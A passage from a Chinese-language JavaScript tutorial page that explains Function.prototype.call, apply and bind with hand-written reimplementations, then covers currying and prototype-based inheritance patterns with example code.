hello</span></span><br></pre></td></tr></table></figure><p>所以，<code>call</code> 主要实现了以下两个功能：</p><ul><li><code>call</code> 改变了 <code>this</code> 的指向</li><li><code>bottle</code> 执行了 <code>sayWord</code> 函数</li></ul><p>上面代码等效于</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bottle = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;bottle&#x27;</span>, </span><br><span class="line">    <span class="attr">word</span>: <span class="string">&#x27;hello&#x27;</span>,</span><br><span class="line">    <span class="attr">sayWord</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> talk = [<span class="built_in">this</span>.name, <span class="string">&#x27;say&#x27;</span>, <span class="built_in">this</span>.word].join(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(talk);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">bottle.sayWord();</span><br><span class="line"><span class="comment">// bottle say hello</span></span><br></pre></td></tr></table></figure><p>这里<strong>把函数作为对象的属性存在</strong>，通过<strong>对象属性执行函数</strong>时，相当于对this进行了<strong>隐式绑定</strong>。</p><h3 id="模拟实现-call"><a href="#模拟实现-call" class="headerlink" title="模拟实现 call"></a>模拟实现 call</h3><p>模拟实现 <code>call</code> 有三步：</p><ul><li><strong>将函数设置为绑定对象的属性</strong></li><li>执行函数</li><li>删除对象的这个属性</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.newCall = <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 注意：非严格模式下, </span></span><br><span class="line">    <span class="comment">// 指定为 null 和 undefined 的 this 值会自动指向全局对象(浏览器中就是 window 对象)</span></span><br><span class="line">    <span class="comment">// 值为原始值(数字，字符串，布尔值)的 this 会指向该原始值的自动包装对象(用 Object() 转换）</span></span><br><span class="line">    context = context ? <span class="built_in">Object</span>(context) : <span class="built_in">window</span>; </span><br><span class="line">    <span class="comment">// 将函数设为对象的属性</span></span><br><span class="line">    <span class="comment">// newCall由函数调用，此时的this指向函数，是一种隐式绑定</span></span><br><span class="line">    context.fn = <span class="built_in">this</span>;</span><br><span class="line">      </span><br><span class="line">    <span class="comment">// 执行该函数</span></span><br><span class="line">    <span class="keyword">const</span> args = [...arguments].slice(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">const</span> result = context.fn(...args);</span><br><span class="line">      </span><br><span class="line">    <span class="comment">// 删除该函数</span></span><br><span class="line">    <span class="keyword">delete</span> context.fn</span><br><span class="line">    <span class="comment">// 注意：函数是可以有返回值的</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>补充</p></blockquote><p><strong>封装实参的对象</strong> <code>arguments</code></p><ul><li>arguments是一个<strong>类数组</strong>对象,它也可以通过索引来操作数据，也可以获取长度。</li><li>在调用函数时，我们所传递的实参都会在arguments中保存</li><li><code>arguments.length</code>可以用来获取实参的长度</li><li><code>arguments[0]</code> 表示第一个实参，<code>arguments[1]</code> 表示第二个实参 。。。</li></ul><p><strong>展开语法、剩余参数</strong></p><ul><li><p><strong>展开语法</strong>（扩展运算符）是将<strong>数组</strong>或者<strong>可迭代对象</strong>拆分成逗号分隔的参数序列。</p></li><li><p><strong>剩余参数</strong>语法允许我们将一个不定数量的参数表示为一个数组。</p></li><li><p>剩余语法(Rest syntax) 看起来和展开语法完全相同，不同点在于, 剩余参数用于解构数组和对象。从某种意义上说，剩余语法与展开语法是相反的：展开语法将数组展开为其中的各个元素，而剩余语法则是将多个元素收集起来并“凝聚”为单个元素。</p></li></ul><p><strong>slice()</strong></p><ul><li><code>slice()</code> 方法返回一个新的数组对象，这一对象是一个由 <code>begin</code> 和 <code>end</code> 决定的原数组的<strong>浅拷贝</strong>（包括 <code>begin</code>，不包括<code>end</code>）。</li><li>原始数组不会被改变。</li></ul><h3 id="Function-prototype-apply"><a href="#Function-prototype-apply" class="headerlink" title="Function.prototype.apply()"></a>Function.prototype.apply()</h3><p><code>apply()</code> 方法调用一个具有给定 <code>this</code> 值的函数，以及作为一个<strong>数组（或[类似数组对象）</strong>提供的参数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func.apply(thisArg, [argsArray])</span><br></pre></td></tr></table></figure><p>它运行 <code>func</code> 设置 <code>this = context</code> 并使用类数组对象 <code>args</code> 作为参数列表。</p><p><code>call</code> 和 <code>apply</code> 之间唯一的语法区别是 <code>call</code> 接受一个参数列表，而 <code>apply</code> 则接受带有一个类数组对象。</p><p>需要注意：Chrome 14 以及 Internet Explorer 9 仍然不接受类数组对象。如果传入类数组对象，它们会抛出异常。</p><h3 id="模拟实现-apply"><a href="#模拟实现-apply" class="headerlink" title="模拟实现 apply"></a>模拟实现 apply</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.newApply = <span class="function"><span class="keyword">function</span> (<span class="params">context, arr</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 注意：非严格模式下, </span></span><br><span class="line">    <span class="comment">// 指定为 null 和 undefined 的 this 值会自动指向全局对象(浏览器中就是 window 对象)</span></span><br><span class="line">    <span class="comment">// 值为原始值(数字，字符串，布尔值)的 this 会指向该原始值的自动包装对象(用 Object() 转换）</span></span><br><span class="line">    context = context ? <span class="built_in">Object</span>(context) : <span class="built_in">window</span>; </span><br><span class="line">    <span class="comment">// 将函数设为对象的属性</span></span><br><span class="line">    context.fn = <span class="built_in">this</span>;</span><br><span class="line">    <span class="comment">// 执行该函数</span></span><br><span class="line">    <span class="keyword">const</span> result = arr ? context.fn(...arr):context.fn();</span><br><span class="line">    <span class="comment">// 删除该函数  </span></span><br><span class="line">    <span class="keyword">delete</span> context.fn</span><br><span class="line">    <span class="comment">// 注意：函数是可以有返回值的</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h2><h3 id="Function-prototype-bind"><a href="#Function-prototype-bind" class="headerlink" title="Function.prototype.bind()"></a>Function.prototype.bind()</h3><blockquote><p><code>bind()</code> 方法创建一个新的函数，在 <code>bind()</code> 被调用时，这个新函数的 <code>this</code> 被指定为 <code>bind()</code> 的第一个参数，而其余参数将作为新函数的参数，供调用时使用。</p></blockquote><p><code>bind</code> 方法与 <code>call / apply</code> 最大的不同就是前者返回一个绑定上下文的<strong>函数</strong>，而后两者是<strong>直接执行</strong>了函数。</p><p>来个例子说明下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> value = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">let</span> foo = &#123;</span><br><span class="line">    <span class="attr">value</span>: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line"><span class="attr">value</span>: <span class="built_in">this</span>.value,</span><br><span class="line"><span class="attr">name</span>: name,</span><br><span class="line"><span class="attr">age</span>: age</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">bar.call(foo, <span class="string">&quot;Jack&quot;</span>, <span class="number">20</span>); <span class="comment">// 直接执行了函数</span></span><br><span class="line"><span class="comment">// &#123;value: 1, name: &quot;Jack&quot;, age: 20&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bindFoo1 = bar.bind(foo, <span class="string">&quot;Jack&quot;</span>, <span class="number">20</span>); <span class="comment">// 返回一个函数</span></span><br><span class="line">bindFoo1();</span><br><span class="line"><span class="comment">// &#123;value: 1, name: &quot;Jack&quot;, age: 20&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bindFoo2 = bar.bind(foo, <span class="string">&quot;Jack&quot;</span>); <span class="comment">// 返回一个函数</span></span><br><span class="line">bindFoo2(<span class="number">20</span>);</span><br><span class="line"><span class="comment">// &#123;value: 1, name: &quot;Jack&quot;, age: 20&#125;</span></span><br></pre></td></tr></table></figure><p>通过上述代码可以看出 <code>bind</code> 有如下特性：</p><ul><li>指定 <code>this</code></li><li>传入参数</li><li>返回一个函数</li><li>柯里化</li></ul><p><code>bind</code> 还有一个特性：</p><blockquote><p>一个绑定函数也能使用 new 操作符创建对象：这种行为就像把原函数当成构造器，提供的 this 值被忽略，同时调用时的参数被提供给模拟函数。</p></blockquote><p>来个例子说明下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> value = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">let</span> foo = &#123;</span><br><span class="line">    <span class="attr">value</span>: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.habit = <span class="string">&#x27;shopping&#x27;</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.value);</span><br><span class="line">    <span class="built_in">console</span>.log(name);</span><br><span class="line">    <span class="built_in">console</span>.log(age);</span><br><span class="line">&#125;</span><br><span class="line">bar.prototype.friend = <span class="string">&#x27;kevin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bindFoo = bar.bind(foo, <span class="string">&#x27;Jack&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> obj = <span class="keyword">new</span> bindFoo(<span class="number">20</span>);</span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line"><span class="comment">// Jack</span></span><br><span class="line"><span class="comment">// 20</span></span><br><span class="line"></span><br><span class="line">obj.habit;</span><br><span class="line"><span class="comment">// shopping</span></span><br><span class="line"></span><br><span class="line">obj.friend;</span><br><span class="line"><span class="comment">// kevin</span></span><br></pre></td></tr></table></figure><p>上面例子中，运行结果 <code>this.value</code> 输出为 <code>undefined</code> ，这不是全局 <code>value</code> 也不是 <code>foo</code> 对象中的 <code>value</code> ，这说明 <code>bind</code> 的 <code>this</code> 对象失效了，<code>new</code> 的实现中生成一个新的对象，这个时候的 <code>this</code> 指向的是 <code>obj</code> 。</p><h3 id="模拟实现bind"><a href="#模拟实现bind" class="headerlink" title="模拟实现bind"></a>模拟实现bind</h3><p>大体思路：</p><ul><li><p>拷贝源函数:</p><ul><li><p>通过变量储存源函数  <code>const self = this;</code>  this 指向源函数</p></li><li><p>使用空对象或<code>Object.create</code>复制源函数的prototype给返回函数</p></li></ul></li><li><p>返回拷贝的函数</p></li><li><p>调用拷贝的函数：</p><ul><li><p>new调用判断：通过<code>instanceof</code>判断函数是否通过<code>new</code>调用，来决定绑定的<code>context</code></p></li><li><p>绑定this+传递参数 <code>apply</code></p></li><li><p>返回源函数的执行结果</p></li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.newBind = <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 调用 bind 的不是函数，需要抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">this</span> !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Function.prototype.bind - what is trying to be bound is not callable&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// this 指向调用者</span></span><br><span class="line">    <span class="keyword">const</span> self = <span class="built_in">this</span>;</span><br><span class="line">    <span class="comment">// 实现第2点，因为第1个参数是指定的this,所以只截取第1个之后的参数</span></span><br><span class="line">    <span class="keyword">const</span> args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建一个空对象</span></span><br><span class="line">    <span class="keyword">const</span> fNOP = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 实现第3点,返回一个函数</span></span><br><span class="line">    <span class="keyword">const</span> fBound = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 实现第4点，获取 bind 返回函数的参数</span></span><br><span class="line">        <span class="keyword">const</span> bindArgs = [].slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">        <span class="comment">// 然后同传入参数合并成一个参数数组，并作为 self.apply() 的第二个参数</span></span><br><span class="line">        <span class="keyword">return</span> self.apply(<span class="built_in">this</span> <span class="keyword">instanceof</span> fNOP ? <span class="built_in">this</span> : context, args.concat(bindArgs));</span><br><span class="line">        <span class="comment">// 当作为构造函数时，`this` 指向实例，此时 `this instanceof fBound` 结果为 `true` </span></span><br><span class="line">        <span class="comment">// 可以让实例获得来自绑定函数的值</span></span><br><span class="line">        <span class="comment">// 当作为普通函数时，`this` 指向 `window` ，此时结果为 `false` </span></span><br><span class="line">        <span class="comment">// 将绑定函数的 `this` 指向 `context`</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 空对象的原型指向绑定函数的原型</span></span><br><span class="line">    fNOP.prototype = self.prototype;</span><br><span class="line">    <span class="comment">// 空对象的实例赋值给返回函数 实例就可以继承绑定函数的原型中的值</span></span><br><span class="line">    fBound.prototype = <span class="keyword">new</span> fNOP();</span><br><span class="line">    <span class="keyword">return</span> fBound;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至于为什么使用一个空对象 <code>fNOP</code> 作为中介，把 <code>fBound.prototype</code> 赋值为空对象的实例（原型式继承），这是因为直接 <code>fBound.prototype = this.prototype</code> 有一个缺点，修改 <code>fBound.prototype</code> 的时候，也会直接修改 <code>this.prototype</code> ；其实也可以直接使用ES5的 <code>Object.create()</code> 方法生成一个新对象，但 <code>bind</code> 和 <code>Object.create()</code> 都是ES5方法，部分IE浏览器（IE &lt; 9）并不支持。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (self.prototype) &#123;</span><br><span class="line">    <span class="comment">// 复制源函数的prototype给fBound 一些情况下函数没有prototype，比如箭头函数</span></span><br><span class="line">    fBound.prototype=<span class="built_in">Object</span>.create(self.prototype) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意：</strong> <code>bind()</code> 函数在 ES5 才被加入，所以并不是所有浏览器都支持，<code>IE8</code> 及以下的版本中不被支持。</p><h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><h4 id="类数组-gt-数组"><a href="#类数组-gt-数组" class="headerlink" title="类数组-&gt;数组"></a>类数组-&gt;数组</h4><p><code>slice</code> 方法可以用来将一个类数组（Array-like）对象/集合转换成一个新数组。你只需将该方法绑定到这个对象上。</p><p> 除了使用 <code>Array.prototype.slice.call(arguments)</code>，你也可以简单的使用 <code>[].slice.call(arguments)</code> 来代替。</p><h4 id="柯里化"><a href="#柯里化" class="headerlink" title="柯里化"></a>柯里化</h4><p>在计算机科学中，柯里化（Currying）是把<strong>接受多个参数的函数变换成接受一个单一参数(最初函数的第一个参数)的函数，并且返回接受余下的参数且返回结果的新函数的技术</strong>。这个技术由 Christopher Strachey 以逻辑学家 Haskell Curry 命名的，尽管它是 Moses Schnfinkel 和 Gottlob Frege 发明的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> add = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> increment = add(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> addTen = add(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">increment(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">addTen(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 12</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 3</span></span><br></pre></td></tr></table></figure><p>这里定义了一个 <code>add</code> 函数，它接受一个参数并返回一个新的函数。调用 <code>add</code> 之后，返回的函数就通过闭包的方式记住了 <code>add</code> 的第一个参数。所以说 <code>bind</code> 本身也是<strong>闭包</strong>的一种使用场景。</p><p><strong>柯里化</strong>是将 <code>f(a,b,c)</code> 可以被以 <code>f(a)(b)(c)</code> 的形式被调用的转化。JavaScript 实现版本通常保留函数被正常调用和在参数数量不够的情况下返回偏函数这两个特性。</p><h1 id="继承方法"><a href="#继承方法" class="headerlink" title="继承方法"></a>继承方法</h1><h2 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h2><p>构造函数、原型和实例之间的关系：每个构造函数都有一个原型对象，原型对象都包含一个指向构造函数的指针，而实例都包含一个原型对象的指针。</p><p>继承的本质就是<strong>复制，即重写原型对象，代之以一个新类型的实例</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.property = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SuperType.prototype.getSuperValue = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.property;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.subproperty = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里是关键，创建SuperType的实例，并将该实例赋值给SubType.prototype</span></span><br><span class="line">SubType.prototype = <span class="keyword">new</span> SuperType(); </span><br><span class="line"></span><br><span class="line">SubType.prototype.getSubValue = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.subproperty;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> instance = <span class="keyword">new</span> SubType();</span><br><span class="line"><span class="built_in">console</span>.log(instance.getSuperValue()); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2018/10/30/166c2c0107fd80c7~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>原型链方案存在的缺点：多个实例对引用类型的操作会被篡改。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.colors = [<span class="string">&quot;red&quot;</span>, <span class="string">&quot;blue&quot;</span>, <span class="string">&quot;green&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">SubType.prototype = <span class="keyword">new</span> SuperType();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> instance1 = <span class="keyword">new</span> SubType();</span><br><span class="line">instance1.colors.push(<span class="string">&quot;black&quot;</span>);</span><br><span class="line">alert(instance1.colors); <span class="comment">//&quot;red,blue,green,black&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> instance2 = <span class="keyword">new</span> SubType(); </span><br><span class="line">alert(instance2.colors); <span class="comment">//&quot;red,blue,green,black&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="借用构造函数"><a href="#借用构造函数" class="headerlink" title="借用构造函数"></a>借用构造函数</h2><p>使用父类的构造函数来增强子类<strong>实例</strong>，等同于复制父类的实例给子类（不使用原型）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">SuperType</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.color=[<span class="string">&quot;red&quot;</span>,<span class="string">&quot;green&quot;</span>,<span class="string">&quot;blue&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">SubType</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//继承自SuperType</span></span><br><span class="line">    SuperType.call(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> instance1 = <span class="keyword">new</span> SubType();</span><br><span class="line">instance1.color.push(<span class="string">&quot;black&quot;</span>);</span><br><span class="line">alert(instance1.color);<span class="comment">//&quot;red,green,blue,black&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> instance2 = <span class="keyword">new</span> SubType();</span><br><span class="line">alert(instance2.color);<span class="comment">//&quot;red,green,blue&quot;</span></span><br></pre></td></tr></table></figure><p>核心代码是<code>SuperType.call(this)</code>，创建子类实例时调用<code>SuperType</code>构造函数，于是<code>SubType</code>的每个实例都会将<code>SuperType</code>中的属性复制一份。</p><p>缺点：</p><ul><li>只能继承父类的<strong>实例</strong>属性和方法，不能继承<strong>原型</strong>属性/方法</li><li>无法实现复用，每个子类都有父类实例函数的副本，影响性能</li></ul><h2 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h2><p>组合上述两种方法就是组合继承。用原型链实现对<strong>原型</strong>属性和方法的继承，用借用构造函数技术来实现<strong>实例</strong>属性的继承。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = name;</span><br><span class="line">  <span class="built_in">this</span>.colors = [<span class="string">&quot;red&quot;</span>, <span class="string">&quot;blue&quot;</span>, <span class="string">&quot;green&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line">SuperType.prototype.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="built_in">this</span>.name);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params">name, age</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 继承属性</span></span><br><span class="line">  <span class="comment">// 第二次调用SuperType()</span></span><br><span class="line">  SuperType.call(<span class="built_in">this</span>, name);</span><br><span class="line">  <span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承方法</span></span><br><span class="line"><span class="comment">// 构建原型链</span></span><br><span class="line"><span class="comment">// 第一次调用SuperType()</span></span><br><span class="line">SubType.prototype = <span class="keyword">new</span> SuperType(); </span><br><span class="line"><span class="comment">// 重写SubType.prototype的constructor属性，指向自己的构造函数SubType</span></span><br><span class="line">SubType.prototype.constructor = SubType; </span><br><span class="line">SubType.prototype.sayAge = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="built_in">this</span>.age);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> instance1 = <span class="keyword">new</span> SubType(<span class="string">&quot;Nicholas&quot;</span>, <span class="number">29</span>);</span><br><span class="line">instance1.colors.push(<span class="string">&quot;black&quot;</span>);</span><br><span class="line">alert(instance1.colors); <span class="comment">//&quot;red,blue,green,black&quot;</span></span><br><span class="line">instance1.sayName(); <span class="comment">//&quot;Nicholas&quot;;</span></span><br><span 